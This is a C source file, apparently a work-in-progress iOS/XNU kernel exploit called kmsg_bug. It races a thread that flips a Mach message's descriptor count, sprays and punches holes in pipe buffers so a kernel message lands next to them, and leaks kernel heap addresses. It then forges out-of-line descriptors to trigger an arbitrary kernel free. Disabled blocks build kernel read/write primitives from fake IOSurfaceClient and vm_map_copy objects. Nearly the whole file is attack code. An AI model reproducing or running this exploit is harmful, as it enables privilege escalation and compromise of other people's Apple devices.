//
//  exploit.c
//  kmsg_bug
//
//  Created by Jake James on 3/2/22.
//

#include "exploit.h"
#include <pthread/pthread.h>
#include "exploit_utilities.h"
#include "IOSurface_stuff.h"
#include "spray.h"

#include "ENABLE_HELPER.h"

#if ENABLE_HELPER
#include "helper/proc.h"
#include "helper/find_port.h"
#include "helper/kextrw.h"
#include "helper/offsets.h"
#include "helper/find_IOSurface.h"
#include "helper/find_pipe.h"

extern uint64_t gKernelSlide, gKernelBase;
#endif

#define DEBUG 1

#if 0 
int surfaces[2][4096] = {0};
io_service_t IOSRUC[2] = {0};

int IOSurface_setCapacity_0x2000() {
    kern_return_t ret = _host_page_size(mach_host_self(), (vm_size_t*)&pagesize);
    if (ret) {
        printf("[-] Failed to get page size! 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    io_connect_t IOSurfaceRoot = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (!MACH_PORT_VALID(IOSurfaceRoot)) {
        printf("[-] Failed to find IOSurfaceRoot service\n");
        return KERN_FAILURE;
    }
    
    ret = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSRUC[0]);
    if (ret || !MACH_PORT_VALID(IOSRUC[0])) {
        printf("[-] Failed to open IOSRUC: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    ret = IOServiceOpen(IOSurfaceRoot, mach_task_self(), 0, &IOSRUC[1]);
    if (ret || !MACH_PORT_VALID(IOSRUC[1])) {
        printf("[-] Failed to open IOSRUC: 0x%x (%s)\n", ret, mach_error_string(ret));
        return ret;
    }
    
    struct IOSurfaceFastCreateArgs create_args = {
        .alloc_size = pagesize
    };
    
    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = 0xf60;
    
    for (int i = 0; i < 4096; i++) {
        ret = IOConnectCallMethod(IOSRUC[0], IOSurfaceRootUserClient_create_surface_selector, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
        if (ret) {
            printf("[-] Failed to create IOSurfaceClient: 0x%x (%s)\n", ret, mach_error_string(ret));
            return ret;
        }
    
        surfaces[0][i] = lock_result.surface_id;
    }
    
    for (int i = 0; i < 4096; i++) {
        release_IOSurface(IOSRUC[0], surfaces[0][i]);
        surfaces[0][i] = 0;
    }
    
    for (int i = 0; i < 4096; i++) {
        ret = IOConnectCallMethod(IOSRUC[1], IOSurfaceRootUserClient_create_surface_selector, NULL, 0, &create_args, sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);
        if (ret) {
            printf("[-] Failed to create IOSurfaceClient: 0x%x (%s)\n", ret, mach_error_string(ret));
            return ret;
        }
#if DEBUG
        printf("[i] Surface id: %d\n", lock_result.surface_id);
#endif
        surfaces[1][i] = lock_result.surface_id;
        
        if (surfaces[1][i] == 8100) break;
    }
    
    return 0;
}

void release_all() {
    for (int i = 0; i < 4096; i++) {
        if (surfaces[1][i]) {
            printf("[*] Releasing %d\n", surfaces[1][i]);
            fflush(stdout);
            usleep(10);
            release_IOSurface(IOSRUC[1], surfaces[1][i]);
        }
    }
}
#endif


// N_DESC = 14 and N_CORRUPTED = 1014 will make a message have 0x4000 size
// (there are other combinations however for some reason ones where difference is lower don't work?)

#define N_DESC 14
#define N_CORRUPTED 1014

// how many pipes to spray
#define N_SPRAY 1000

// size of each pipe buffer
#define KALLOC_SIZE 0x4000

// size of ool buffer
#define OOL_SIZE 0x100
#define BIG_BUFFER_SIZE 0x4000

struct exp_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports;
    mach_msg_ool_descriptor_t ool_desc[N_CORRUPTED - 1];
};

struct exp_msg msg;

void race_thread() {
    while (1) {
        // continue;
        // change the descriptor count back and forth
        // eventually the race will work just right so we get this order of actions:
        // count = N_DESC -> first copyin -> count = N_CORRUPTED -> second copyin
        msg.body.msgh_descriptor_count = N_CORRUPTED;
        msg.body.msgh_descriptor_count = N_DESC;
    }
}

#if 0
void *fake_IOSC;
void *fake_IOS;
void *gBuf;
uint64_t gBuf_kspace;
int rfd; 
int wfd;

uint64_t ool_ports_buffer = 0;
uint64_t IOSC_array = 0;

int opipe[2] = {0};

mach_port_t dest;

// these are racy, should put locks, but this is just an exploit, so idc
uint32_t rk32(uint64_t addr) {
    read(rfd, gBuf, 0x8000);
    *(uint64_t*)(fake_IOSC + 0x40) = addr - 0xb4;
    write(wfd, gBuf, 0x8000-1);

    // REFERENCE
    // *(uint64_t*)(fake_IOS + 0x358) = (uint64_t)(gBuf_kspace+0x2000) + 0x1000; // fake timestamp array = fake ycbcrmatrix array
                  //  *(uint64_t*)(fake_IOS + 0xb4)
                    // *(uint64_t*)(fake_IOSC + 0x40) = (uint64_t)(gBuf_kspace+0x3000);

    uint32_t val;
    int ret = IOSurface_get_ycbcrmatrix(IOSRUC[1], surfaces[1][0], &val);

    
    read(rfd, gBuf, 0x8000);
    *(uint64_t*)(fake_IOSC + 0x40) = (uint64_t)fake_IOS;
    write(wfd, gBuf, 0x8000-1);
    
    if (ret) {
        printf("[-][rk32] Error get_ycbcrmatrix: %s\n", mach_error_string(ret));
        return 0;
    }
    return val;
}

uint64_t rk64(uint64_t addr) {
    uint32_t val1 = rk32(addr);
    uint64_t val2 = rk32(addr + 4);
    uint64_t val64 = val1 | (val2 << 32);
    return val64;
}

int wk64(uint64_t addr, uint64_t what) {
    read(rfd, gBuf, 0x8000);
    *(uint64_t*)(fake_IOS + 0x358) = addr;
    // *(uint64_t*)(gBuf + 0x2000 + 0x40) = addr;
    write(wfd, gBuf, 0x8000-1);

    // REFERENCE
    // fake_IOSC = gBuf + 0x2000; // fake IOSurfaceClient
    // *(uint64_t*)(fake_IOS + 0x358) = (uint64_t)(gBuf_kspace+0x2000) + 0x1000; // fake timestamp array = fake ycbcrmatrix array
                  //  *(uint64_t*)(fake_IOS + 0xb4)
                    // *(uint64_t*)(fake_IOSC + 0x40) = (uint64_t)(gBuf_kspace+0x3000);
                    //ref2...
                    //[*] Allocated pipe kaddr(gBuf_kspace) = 0xfffffe30064cc000
                    //(lldb) x/16gx 0xfffffe30064ce000
                    // 0xfffffe30064ce000: 0x0000000000000000 0xfffffe30003c4030
                    // 0xfffffe30064ce010: 0x0000000000000000 0x0000000000000000
                    // 0xfffffe30064ce020: 0x0000000000000000 0x0000000000000000
                    // 0xfffffe30064ce030: 0x0000000000000000 0x0000000000000000
                    // 0xfffffe30064ce040: 0xfffffe30064cf000 0x0000000000000000
                    //0xfffffe30064cf000: 0x4142434445464748 0x0000000000400000

    int ret = IOSurface_set_indexed_timestamp(IOSRUC[1], surfaces[1][0], 0, what);

    
    read(rfd, gBuf, 0x8000-1);
    *(uint64_t*)(fake_IOS + 0x358) = (uint64_t)fake_IOS + 0x1000;
    // *(uint64_t*)(gBuf + 0x2000 + 0x40) = (uint64_t)fake_IOS + 0x1000;
    write(wfd, gBuf, 0x8000-1);

    if (ret) {
        printf("[-][wk64] Error set_indexed_timestamp: %s\n", mach_error_string(ret));
        return ret;
    }
    return 0;
}

void after_thread() {
    // wait a little bit
    sleep(1); // probably too much
  
    // uint64_t test = (uint64_t)malloc(8); // let's pretend this is a kernel address
    #define IOMallocZero_external 0xFFFFFE0007C85B80-0x4b4000+gKernelSlide
    uint64_t allocated_kptr = kextrw_kcall(IOMallocZero_external, (uint64_t []){ 0x4000 }, 1);
    printf("allocated_kptr = 0x%llx\n", allocated_kptr);
    wk64(allocated_kptr, 0x4142434445464748);
    printf("[i] Wrote: 0x%lx\n", 0x4142434445464748);
    printf("[i] Read back: 0x%llx\n", rk64(allocated_kptr));
    printf("[i] gKernelBase: 0x%lx\n", gKernelBase);
    printf("[i] Read back(2): 0x%llx\n", rk64(gKernelBase));
    
    //figure out how to cleanup exploit
    sleep(1);
    read(rfd, gBuf, 0x8000);
    // *(uint8_t*)(gBuf + 0x3000 + 0xa) = 0; // unlock stuff? unset p/x offsetof(vm_object, Lock.word.can_sleep)
    *(uint64_t*)(gBuf + 0x3000 + 0xa4) = 0; // unset mapping_in_progress //p/x offsetof(vm_object, mapping_in_progress)
    // memset(gBuf, 0xFF, 0x8000);
    write(wfd, gBuf, 0x8000-1);
    // resume_all_threads();
    printf("mach_port_destroy?\n");
    kern_return_t ret = mach_port_destroy(mach_task_self(), dest);
    printf("ret = 0x%llx\n", ret);
    exit(1);
    // printf("[*] Panic!!\n");
    // fflush(stdout);
    // sleep(1);
    // getchar();
    // wk64(0x4141414141414141, 0x4242424242424242);
}

void hexdump64(uint64_t addr, size_t size) {
    void *data = malloc(size);
    if (!data) return;
    memcpy((void*)data, (void*)addr, size);

    size_t offset;
    for (offset = 0; offset < size; offset += 16) {
        uint64_t v1 = 0, v2 = 0;
        size_t rem = size - offset;

        size_t n1 = rem >= 8 ? 8 : rem;
        if (n1)
            memcpy(&v1, (unsigned char*)data + offset, n1);

        if (rem > 8) {
            size_t n2 = (rem - 8) >= 8 ? 8 : (rem - 8);
            memcpy(&v2, (unsigned char*)data + offset + 8, n2);
        }

        printf("0x%016llx: 0x%016llx 0x%016llx\n",
               (unsigned long long)(addr + offset),
               (unsigned long long)v1,
               (unsigned long long)v2);
    }

    free(data);
}
#endif

#define PORTS_COUNT 0x2a00 
#define KMSG_SIZE 0x3F80
mach_port_t notif_port = MACH_PORT_NULL;
mach_port_t *kheap_default_ports = NULL;
mach_port_t *kheap_data_ports = NULL;
int exploitation_init(void)
{
    // different by device, retrieve it first and fail if unsuccessful
    // extra_frees_for_device = IOGPU_get_command_queue_extra_refills_needed();
    // if (extra_frees_for_device == -1)
    // {
    //     printf("Exiting early, provide correct number 1-5 in the code for this device to proceed\n");
    //     return 1;
    // }
    
    kheap_data_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    kheap_default_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *contained_ports = malloc(PORTS_COUNT * sizeof(mach_port_t));
    mach_port_t *ool_ports = malloc(0x4000);
    uint8_t *kheap_data_spray_buf = malloc(0x4000);
    memset(kheap_data_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(kheap_default_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(contained_ports, 0, PORTS_COUNT * sizeof(mach_port_t));
    memset(ool_ports, 0, 0x4000);
    memset(kheap_data_spray_buf, 0, 0x4000);
     
    // initialize the inline data
    
    // fake descriptor for free primitive
    // *(uint32_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t)) = 1;
    // *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t)) = KHEAP_DEFAULT_MAPPABLE_LOC; // free primitive target
    // *(uint64_t *)(kheap_data_spray_buf + sizeof(mach_msg_header_t) + sizeof(uint32_t) + sizeof(uint64_t)) = 0x000007F802110000; // disposition, size, etc
    // align a pointer here so that when the kmsg trailer size is corrupted, this pointer
    // will after that be followed and a second bytecopy performed where it points (kmsg message bits)
    // *(uint64_t *)(kheap_data_spray_buf + 0x3F64) = BYTECOPY_SECOND_TARGET;
    
    // spray large sprays to map  KHEAP_DATA_MAPPABLE_LOC and KHEAP_DEFAULT_MAPPABLE_LOC
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        // KHEAP_DEFAULT
        *ool_ports = port_new();
        contained_ports[i] = *ool_ports;
        mach_port_t *pp = spray_default_kalloc_ool_ports(0x4000, 1, ool_ports);
        kheap_default_ports[i] = pp[0];
        free(pp);
        
        // KHEAP_DATA_BUFFERS
        // kheap_data_ports[i] = spray_data_kalloc_kmsg_single(kheap_data_spray_buf, KMSG_SIZE);
    }

#if ENABLE_HELPER
    for (int i = 0; i < PORTS_COUNT; ++i)
    {
        printf("kallocated address (type: KHEAP_DEFAULT) = 0x%llx\n", find_oolports_from_port(kheap_default_ports[i]));
    }

    // for (int i = 0; i < PORTS_COUNT; ++i) 
    // {
    //     printf("kallocated address (type: KHEAP_DATA_BUFFERS) = 0x%llx\n", find_kmsgdata_from_port(kheap_data_ports[i]));
    // }
#endif 
    
    // notif_port = port_new();
    // for (int i = 0; i < PORTS_COUNT; ++i)
    // {
    //     mach_port_t prev;
    //     mach_port_request_notification(mach_task_self(), contained_ports[i], MACH_NOTIFY_NO_SENDERS, 0, notif_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev);
    //     mach_port_deallocate(mach_task_self(), contained_ports[i]);
    // }
    
    // pre-init kernel rw
    // IOSurfaceClient_array_buf = malloc(0x4000);
    // kernel_rw_preinit(KHEAP_DATA_MAPPABLE_LOC - 0x4000 + 0x10, IOSurfaceClient_array_buf, 0x4000);
    
    free(contained_ports);
    free(ool_ports);
    free(kheap_data_spray_buf);
    
    return 0;
}

void exploit() {
#if ENABLE_HELPER
    if(kextrw_init() != 0) {
        printf("kextrw_init() failed!\n");
        while(1) {};
    }
    kextrw_get_kernel_base();
    offsets_init();
    
    // goto TEST;

#endif

    void *body = calloc(1, KALLOC_SIZE);
    
    // allow us to spray a lot of pipes
    increase_file_limit();

    // exploitation_init();    //XXX
    
    // ool buffer
    void* buf = calloc(1, OOL_SIZE * N_DESC);
    
    void *ports = calloc(1, BIG_BUFFER_SIZE/2); // size of a port in userland is half its size in kernel
    
    // set up the message
    msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg.hdr.msgh_size = (mach_msg_size_t)(sizeof(struct exp_msg));
    msg.hdr.msgh_remote_port = 0;
    msg.hdr.msgh_local_port = MACH_PORT_NULL;
    msg.hdr.msgh_id = 0x12341234;
    
    // set the initial (smaller) descriptor count
    msg.body.msgh_descriptor_count = N_DESC;
    
    // ool ports descriptor
    msg.ool_ports.address = ports;
    msg.ool_ports.count = BIG_BUFFER_SIZE / 8;
    msg.ool_ports.deallocate = 0;
    msg.ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg.ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    msg.ool_ports.disposition = MACH_MSG_TYPE_COPY_SEND;
    
    // ool descriptors
    for (int i = 0; i < N_DESC - 1; i++) {
        msg.ool_desc[i].address = buf + i * OOL_SIZE;
        msg.ool_desc[i].size = OOL_SIZE;
        msg.ool_desc[i].deallocate = 0;
        msg.ool_desc[i].type = MACH_MSG_OOL_DESCRIPTOR;
        msg.ool_desc[i].copy = MACH_MSG_PHYSICAL_COPY;
    }
    
    // original writeup uses a mach message for this, but we'd have to fix up the trailer to avoid breaking its signature, also pipes allow us to write back without reallocating
    printf("[*] Spraying pipe buffers\n");
    int pipes[N_SPRAY][2] = {0};

    for (int i = 0; i < N_SPRAY; i++) {
        int ret = pipe(pipes[i]);
        if (ret) {
            printf("[-] Failed to create pipe: %s\n", strerror(errno));
            continue;
        }
        
        set_nonblock(pipes[i][0]);
        set_nonblock(pipes[i][1]);
        memset(body, 0x71, KALLOC_SIZE);
        
        // -1 otherwise it'll make the size bigger
        ret = write(pipes[i][1], body, KALLOC_SIZE - 1);
        printf("[*] pipe write ret = 0x%x, spray_cnt = %d\n", ret, i);

#if ENABLE_HELPER 
        printf("[*] Allocated pipe kaddr = 0x%llx, i = %d\n", obtain_pipe_kaddr(pipes[i][0]), i);
#endif
    }
    

    // -----------+-----------+-----------+------------+-----------
    //    pipe1   |   pipe2   |    ...    |  pipe5000  |
    // -----------+-----------+-----------+------------+-----------
    //
    
    // poke some holes to increase chance of landing right after a pipe
    printf("[*] Poking holes\n");
    fflush(stdout);
    for (int i = 0; i < N_SPRAY; i++) {
        if (i % 64 == 0) {
            #if ENABLE_HELPER
            printf("[*] Freed pipe kaddr = 0x%llx, i = %d\n", obtain_pipe_kaddr(pipes[i][0]), i);
            #endif
            close(pipes[i][0]);
            close(pipes[i][1]);
            pipes[i][0] = 0;
            pipes[i][1] = 0;
        }
    }
  
    // -----------+-----------+-----------+------------+------------+------------+-----------
    //    pipe1   |   pipe2   |    ...    |   pipe64   |    FREE    |   pipe67   |    ...
    // -----------+-----------+-----------+------------+------------+------------+-----------
    //
    exploitation_init();    //XXX
    printf("[*] Racing\n");
    
    // more reliability voodoo
    pthread_attr_t pattr;
    pthread_attr_init(&pattr);
    pthread_attr_set_qos_class_np(&pattr, QOS_CLASS_USER_INITIATED, 0);
    // start the threads
    pthread_t thread;
    pthread_create(&thread, &pattr, (void*)race_thread, NULL);

    // try up to 100000 times
    for (int i = 0; i < 100000; i++) {

        // create a mach port where we'll send the message
        mach_port_t dest = new_mach_port();
    
        // send
        msg.hdr.msgh_remote_port = dest;
        // printf("will going to call mach_msg... msg = %p, msg->hdr.msgh_size = 0x%x, press enter to continue\n", msg, msg.hdr.msgh_size);
        // getchar();
        // int ret = mach_msg(&msg.hdr, MACH_SEND_MSG | MACH_MSG_OPTION_NONE, msg.hdr.msgh_size, 0, MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        int ret = mach_msg_send(&msg);
        if (ret) printf("error: %s\n", mach_error_string(ret));

        #if ENABLE_HELPER
        printf("Allocated kmsg, ikm_header = 0x%llx, i = %d\n", (find_kmsgdata_from_port(msg.hdr.msgh_remote_port)), i);
        #endif
        // getchar();
        // continue;
    
        // hopefully (pre-trigger):
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
        //    pipe1   |   pipe2   |    ...    |   pipeN   | ikm_header |   pipeN+2   |    ...
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
        //
        
        // after bug trigger pipeN should overlap with ikm_header:
        
        //                                            +----------------+
        //                                            |                |
        // -----------+-----------+-----------+-----------+            +-------------+-----------
        //    pipe1   |   pipe2   |    ...    |   pipeN   | ikm_header |   pipeN+2   |    ...
        // -----------+-----------+-----------+-----------+------------+-------------+-----------
       
        
        // check if we overwrote one of the pipe buffers
        int opipe[2] = {0};
        for (int i = 0; i < N_SPRAY; i++) {
            if (pipes[i][0] && pipes[i][0] != opipe[0]) {;
                ssize_t ret = read(pipes[i][0], body, KALLOC_SIZE);
                if (ret == -1) {
                    printf("[-] Failed to read pipe: %s\n", strerror(errno));
                    continue;
                }
   
                // there seem to be some extra 56 bytes between the two
                int off = KALLOC_SIZE - 4 * (N_CORRUPTED - N_DESC) + 56;
                
                if (*(uint32_t*)(body + off) == 0x80000011) {
                    printf("[+] Found ikm_header at pipe nr. %d\n", i);
                    // exploitation_init(); //XXX
                    struct ool_kmsg *kmsg = body+off;
                    
#if DEBUG
                    for (int i = 0; i < N_DESC; i++) {
                        uint64_t kaddr = (uint64_t)kmsg->ool_messages[i].address;
                        printf("[i] 0x%llx\n", kaddr);
                    }
#endif
                     
                    uint64_t ool_ports_buffer = (uint64_t)kmsg->ool_messages[0].address;
                    
                    // assume this scenario is true and hope for the best
                    // IOSC_array = ool_ports_buffer - BIG_BUFFER_SIZE;
                    
                    // save the pipe
                    opipe[0] = pipes[i][0];
                    opipe[1] = pipes[i][1];
                    
                    pipes[i][0] = 0;
                    pipes[i][1] = 0;
                    
                    // close other pipes
                    for (int i = 0; i < N_SPRAY; i++) {
                        if (pipes[i][0]) close(pipes[i][0]);
                        if (pipes[i][1]) close(pipes[i][1]);
                    }
                    
                    printf("[+] Leaked ool ports buffer: 0x%llx\n", ool_ports_buffer);
                    // printf("[+] Calculated IOSurfaceClient array address: 0x%llx\n", IOSC_array);
                    // printf("[!] orig surfClients: 0x%llx\n", surfClients);

                    // fake descriptor for free primitive
                    kmsg->ool_messages[0].address = (uint64_t)KHEAP_DEFAULT_MAPPABLE_LOC;
                    kmsg->ool_messages[0].deallocate = false;
                    kmsg->ool_messages[0].copy = MACH_MSG_PHYSICAL_COPY;
                    kmsg->ool_messages[0].disposition = MACH_MSG_TYPE_MOVE_SEND;
                    kmsg->ool_messages[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
                    kmsg->ool_messages[0].count = 0x7F8;

                    for(int i = 1; i < N_DESC; i++) {
                        kmsg->ool_messages[i].address = (uint64_t)0;
                        kmsg->ool_messages[i].deallocate = false;
                        kmsg->ool_messages[i].copy = 0;
                        kmsg->ool_messages[i].disposition = 0;
                        kmsg->ool_messages[i].type = 0;
                        kmsg->ool_messages[i].count = 0;
                    }

                    // ret = write(opipe[1], body, KALLOC_SIZE);
                    // printf("write ret = 0x%x\n", ret);


                    // getchar();
                    // IOSC_array = surfClients;
                    
                    #if 0 
                    gBuf = calloc(1, 0x8000); // need to calculate on A10+
                    printf("callac buf = %p\n", gBuf);
                    memset(gBuf, 0, 0x8000);

                    int pipefds[2];
                    int ret = pipe(pipefds);
                    rfd = pipefds[0];
                    wfd = pipefds[1];
                    set_nonblock(rfd);
                    set_nonblock(wfd);
                    
                    ret = write(wfd, body, 0x8000 - 1);
                    printf("write ret = 0x%x\n", ret);
                    ret = read(rfd, body, 0x8000);
                    printf("read ret = 0x%x\n", ret);
                        
                    gBuf_kspace = obtain_pipe_kaddr(rfd);
                    printf("[*] Allocated pipe kaddr(gBuf_kspace) = 0x%llx\n", gBuf_kspace);
                    
                    
                    struct vm_map_copy *copy = gBuf;
                    struct vm_map_links *entry = gBuf + 0x1000;
                    
                    copy->type = VM_MAP_COPY_ENTRY_LIST; // we need the entry list type
                    copy->c_u.hdr.nentries = 1; // doesn't really matter
                    copy->c_u.hdr.links.next = (struct vm_map_entry*)(gBuf_kspace+0x1000); // the fake entry
                    *(uint64_t*)(((uint64_t)&copy->c_u.hdr) + 0x28) = 0xffffffffbaadc0d1; // do this to skip some useless code
                    
                    fake_IOSC = gBuf + 0x2000; // fake IOSurfaceClient
                    fake_IOS = gBuf + 0x3000; // fake IOSurface
                    
                    *(uint64_t*)(fake_IOS + 0x358) = (uint64_t)(gBuf_kspace+0x2000) + 0x1000; // fake timestamp array = fake ycbcrmatrix array
                  //  *(uint64_t*)(fake_IOS + 0xb4)
                    *(uint64_t*)(fake_IOSC + 0x40) = (uint64_t)(gBuf_kspace+0x3000);
                    
                    
                    void *vm_object = gBuf + 0x3000;
                    *(uint8_t*)(vm_object + 0xa) = 0x40; // lock stuff p/x offsetof(vm_object, Lock.word.can_sleep) //prevent panic Taking non-sleepable RW lock with preemption enabled...
                    *(uint32_t*)(vm_object + 0x28) = 2; // something that needs to be 2 for it to work  p/x offsetof(vm_object, ref_count)
                    *(uint64_t*)(vm_object + 0x48) = 0xfffffe1515849660; // needs to be non-zero        //p/x offsetof(vm_object, pager)
                    *(uint32_t*)(vm_object + 0x74) = 0x8000000; // needs to be this         //p/x offsetof(vm_object, named)

                    //See  #define vm_object_mapping_wait(object, interruptible) in XNU
                    // *(uint32_t*)(vm_object + 0xa4) = 0x400; // mapping_in_progress = 1      //p/x offsetof(vm_object, mapping_in_progress)
                    
                    entry->prev = (void *)(gBuf_kspace+0x2000);
                    entry->next = (void *)(IOSC_array + surfaces[1][0] * 8);
                    *(uint64_t*)((uint64_t)entry + 0x38) = (uint64_t)(gBuf_kspace + 0x3000); // the fake vm_object
                    *(uint64_t*)((uint64_t)entry + 0x48) = 0; // needs to be 0
                    
                    printf("[*] Writing fake vm_map_copy ptr\n");
                    kmsg->ool_messages[1].address = (void*)gBuf_kspace;
                    ret = write(wfd, gBuf, 0x8000-1);
                    printf("write ret = 0x%x\n", ret);

                    ret = write(opipe[1], body, KALLOC_SIZE);
                    printf("[*] Wrote fake vm_map_copy ptr, ret = 0x%x\n", ret);
                    // hexdump64((uint64_t)buf, 0x5000);
                    // getchar();
                    
                    pthread_t thread;
                    pthread_create(&thread, NULL, (void*)after_thread, NULL);
                   
                    /*
                     this will basically do:
                        entry->next->prev = entry->prev;
                        entry->prev->next = entry->next;
                     
                     and then it'll hang until mapping_in_progress is unset
                    */
                    printf("[*] Writing fake IOSurfaceClient ptr\n");
                    mach_port_destroy(mach_task_self(), dest);
                    #endif

                    // trigger arbitrary free in kheap default
                    printf("mach_port_destroy?\n");
                    getchar();
                    // mach_port_destroy(mach_task_self(), dest);

                    printf("trigger arbitrary freed!?\n");
                    
                    while(1) {};
                    
                    printf("[-] Exploit failed\n");
                    return;
                }
                
                memset(body, 0, KALLOC_SIZE);
                write(pipes[i][1], body, KALLOC_SIZE - 1);
            }
        }
        
        // if bug didn't work, free message and try again
        // if bug worked but pipes weren't affected then we corrupted something else, let this just panic
        mach_port_destroy(mach_task_self(), dest);
    }
    
    printf("[-] Exploit failed\n");
    return;

TEST:
    // printf("ourProc: 0x%llx\n", proc_of_pid(getpid()));

#if ENABLE_HELPER
    kextrw_deinit();
#endif
    return;
}
